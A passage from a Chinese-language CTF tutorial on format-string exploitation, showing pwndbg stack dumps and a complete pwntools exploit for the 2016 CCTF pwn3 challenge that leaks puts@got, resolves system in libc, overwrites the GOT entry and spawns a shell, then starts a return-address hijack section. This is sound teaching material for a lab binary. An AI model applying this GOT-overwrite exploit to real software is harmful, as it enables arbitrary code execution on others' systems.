</span></span><span class="line"><span class="cl">   <span class="mh">0x80488a4</span> <span class="o">&lt;</span><span class="n">get_file</span><span class="o">+</span><span class="mi">174</span><span class="o">&gt;</span>      <span class="n">ret</span>    
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488a5</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">&gt;</span>       <span class="n">push</span>   <span class="n">ebp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488a6</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488a8</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;</span>     <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488ab</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>     <span class="n">lea</span>    <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0xc</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488ae</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488b2</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mh">0x8048bc5</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488b9</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">__isoc99_scanf</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   <span class="mh">0x80488be</span> <span class="o">&lt;</span><span class="n">get_command</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="err">───────────────────────────────────</span><span class="p">[</span> <span class="n">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span>      <span class="mh">0xffffcec0</span> <span class="err">—▸</span> <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>          <span class="mh">0xffffcec4</span> <span class="err">—▸</span> <span class="mh">0x804b598</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcec8</span> <span class="err">◂—</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcecc</span> <span class="err">—▸</span> <span class="mh">0xf7de8f88</span> <span class="err">◂—</span> <span class="n">movsd</span>  <span class="n">dword</span> <span class="n">ptr</span> <span class="nl">es</span><span class="p">:[</span><span class="n">edi</span><span class="p">],</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>          <span class="mh">0xffffced0</span> <span class="err">◂—</span> <span class="mh">0xfbad2887</span>
</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>          <span class="mh">0xffffced4</span> <span class="err">◂—</span> <span class="mh">0x7d4</span>
</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffced8</span> <span class="err">—▸</span> <span class="mh">0xf7fb4220</span> <span class="p">(</span><span class="n">_IO_helper_jumps</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span> <span class="n">eax</span> <span class="n">edx</span>  <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────</span><span class="p">[</span> <span class="n">BACKTRACE</span> <span class="p">]</span><span class="err">──────────────────────────────────</span>
</span></span><span class="line"><span class="cl"> <span class="err">►</span> <span class="n">f</span> <span class="mi">0</span>  <span class="mi">804889</span><span class="n">e</span> <span class="n">get_file</span><span class="o">+</span><span class="mi">168</span>
</span></span><span class="line"><span class="cl">   <span class="n">f</span> <span class="mi">1</span>  <span class="mi">80486</span><span class="n">c9</span> <span class="n">main</span><span class="o">+</span><span class="mi">92</span>
</span></span><span class="line"><span class="cl">   <span class="n">f</span> <span class="mi">2</span> <span class="n">f7df6f21</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">241</span>
</span></span><span class="line"><span class="cl"><span class="err">────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">stack</span> <span class="mi">24</span>
</span></span><span class="line"><span class="cl"><span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span>      <span class="mh">0xffffcec0</span> <span class="err">—▸</span> <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>          <span class="mh">0xffffcec4</span> <span class="err">—▸</span> <span class="mh">0x804b598</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcec8</span> <span class="err">◂—</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcecc</span> <span class="err">—▸</span> <span class="mh">0xf7de8f88</span> <span class="err">◂—</span> <span class="n">movsd</span>  <span class="n">dword</span> <span class="n">ptr</span> <span class="nl">es</span><span class="p">:[</span><span class="n">edi</span><span class="p">],</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>          <span class="mh">0xffffced0</span> <span class="err">◂—</span> <span class="mh">0xfbad2887</span>
</span></span><span class="line"><span class="cl"><span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>          <span class="mh">0xffffced4</span> <span class="err">◂—</span> <span class="mh">0x7d4</span>
</span></span><span class="line"><span class="cl"><span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffced8</span> <span class="err">—▸</span> <span class="mh">0xf7fb4220</span> <span class="p">(</span><span class="n">_IO_helper_jumps</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span> <span class="n">eax</span> <span class="n">edx</span>  <span class="mh">0xffffcedc</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span> <span class="err">↓</span>
</span></span><span class="line"><span class="cl"><span class="mi">09</span><span class="o">:</span><span class="mo">0024</span><span class="err">│</span>          <span class="mh">0xffffcee4</span> <span class="err">—▸</span> <span class="mh">0x8048c00</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ebx</span> <span class="cm">/* &#39;Serv-U FTP Server v6.4 for WinSock ready...&#39; */</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">a</span><span class="p">:</span><span class="mo">002</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcee8</span> <span class="err">—▸</span> <span class="mh">0xf7e511db</span> <span class="p">(</span><span class="n">_IO_file_underflow</span><span class="o">+</span><span class="mi">11</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">edi</span><span class="p">,</span> <span class="mh">0x164e25</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">b</span><span class="p">:</span><span class="mo">002</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffceec</span> <span class="err">—▸</span> <span class="mh">0xf7fb49f4</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">c</span><span class="p">:</span><span class="mo">0030</span><span class="err">│</span>          <span class="mh">0xffffcef0</span> <span class="err">—▸</span> <span class="mh">0xf7fb65c0</span> <span class="p">(</span><span class="n">_IO_2_1_stdin_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0xfbad2288</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">d</span><span class="p">:</span><span class="mo">0034</span><span class="err">│</span>          <span class="mh">0xffffcef4</span> <span class="err">◂—</span> <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"><span class="mi">0</span><span class="nl">e</span><span class="p">:</span><span class="mo">003</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcef8</span> <span class="err">—▸</span> <span class="mh">0x804b598</span> <span class="err">◂—</span> <span class="err">&#39;</span><span class="n">qwerqwer</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="mf">0f</span><span class="o">:</span><span class="mo">003</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcefc</span> <span class="err">—▸</span> <span class="mh">0xf7e5034f</span> <span class="p">(</span><span class="n">__GI__IO_file_xsgetn</span><span class="o">+</span><span class="mi">575</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="mi">10</span><span class="o">:</span><span class="mo">0040</span><span class="err">│</span>          <span class="mh">0xffffcf00</span> <span class="err">—▸</span> <span class="mh">0x804b5a0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mi">11</span><span class="o">:</span><span class="mo">0044</span><span class="err">│</span>          <span class="mh">0xffffcf04</span> <span class="err">—▸</span> <span class="mh">0x804b168</span> <span class="err">◂—</span> <span class="mh">0xa</span> <span class="cm">/* &#39;\n&#39; */</span>
</span></span><span class="line"><span class="cl"><span class="mi">12</span><span class="o">:</span><span class="mo">004</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcf08</span> <span class="err">◂—</span> <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"><span class="mi">13</span><span class="o">:</span><span class="mo">004</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcf0c</span> <span class="err">—▸</span> <span class="mh">0xf7ffd940</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mi">14</span><span class="o">:</span><span class="mo">0050</span><span class="err">│</span>          <span class="mh">0xffffcf10</span> <span class="err">—▸</span> <span class="mh">0xffffcf44</span> <span class="err">—▸</span> <span class="mh">0x804b5a0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mi">15</span><span class="o">:</span><span class="mo">0054</span><span class="err">│</span>          <span class="mh">0xffffcf14</span> <span class="err">—▸</span> <span class="mh">0xf7fb6000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1d7d8c</span>
</span></span><span class="line"><span class="cl"><span class="mi">16</span><span class="o">:</span><span class="mo">005</span><span class="mi">8</span><span class="err">│</span>          <span class="mh">0xffffcf18</span> <span class="err">—▸</span> <span class="mh">0xf7fb4220</span> <span class="p">(</span><span class="n">_IO_helper_jumps</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="mi">17</span><span class="o">:</span><span class="mo">005</span><span class="n">c</span><span class="err">│</span>          <span class="mh">0xffffcf1c</span> <span class="err">—▸</span> <span class="mh">0xf7fb49f4</span> <span class="err">◂—</span> <span class="mh">0x0</span>
</span></span><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span></span></span></code></pre></div><p>可以看出字符串偏移为7，接下来得到puts@got地址：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ow">or</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span></span></span></code></pre></div><p>接下来接收puts函数的真实地址：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span></span></span></code></pre></div><p>由于我们使用的是本地的libc，所以挂载本地的libc就行了。查看一下程序在运行时使用的libc文件：</p>
<pre tabindex="0"><code class="language-linux" data-lang="linux">yutao@pwnbaby:~/ctf-challenges/pwn/fmtstr/2016-CCTF-pwn3$ ldd pwn3
	linux-gate.so.1 (0xf7f10000)
	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d19000)
	/lib/ld-linux.so.2 (0xf7f11000)</code></pre><p>从上图可以看到真正用到的是”/lib/i386-linux-gnu/libc.so.6“这个库，所以把这个库载入进来就可以了：‘</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span></span></span></code></pre></div><p>接下来就是覆盖puts函数了，首先介绍下pwntools中的fmtstr_payload函数</p>
<pre tabindex="0"><code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT: systemAddress}；本题是将0804a048处改为0x2223322
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload</code></pre><p>那么这道题中payload这样写：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">})</span></span></span></code></pre></div><p><strong>EXP：</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">## -*- coding: UTF-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">pwn3</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Name (ftp.hacker.server:Rainism):&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">tmp</span> <span class="o">=</span> <span class="s1">&#39;sysbdmin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tmp</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##登录密码：rxraclhm</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##通过puts函数把部署好的泄露任意地址的payload写进去</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">pwn3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Cyberangel&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="s1">&#39;%8$s&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##通过get泄露puts函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;Cyberangel&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="c1">##从库中找到system函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span> <span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">##将第七个参数的puts函数地址改成system函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="p">{</span><span class="n">puts_got</span><span class="p">:</span> <span class="n">sys_addr</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;put&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;please enter the name of the file you want to upload:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##在运行show_dir时将puts(”/bin/sh;“)变成system(&#34;/bin/sh;&#34;),并成功获取shell</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;then, enter the content:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##通过get打印‘/bin/sh;’文件，执行system(&#39;/bin/sh;&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;ftp&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;enter the file name you want to get:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##通过dir来拿到shell</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><p>最后总结下思路</p>
<ol>
<li>绕过密码</li>
<li>确定格式化字符串参数偏移</li>
<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
<li>修改 puts@got 的内容为 system 的地址。</li>
<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
</ol>
<h3 id="hijack-retaddr" class="heading-element"><span>hijack retaddr</span>
  <a href="#hijack-retaddr" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="原理-2" class="heading-element"><span>原理</span>
  <a href="#%e5%8e%9f%e7%90%86-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址。</p>
<h4 id="例子-2" class="heading-element"><span>例子</span>
  <a href="#%e4%be%8b%e5%ad%90-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>这里用的是<strong>三个白帽-pwnme_k0</strong>为例
<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/</a>三个白帽-pwnme_k0</p>
<p>checksek一下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">hacker</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">ctf</span><span class="o">-</span><span class="n">challenges</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">fmtstr</span><span class="o">/</span><span class="err">三个白帽</span><span class="o">-</span><span class="n">pwnme_k0</span><span class="err">$</span> <span class="n">checksec</span> <span class="n">pwnme_k0</span>
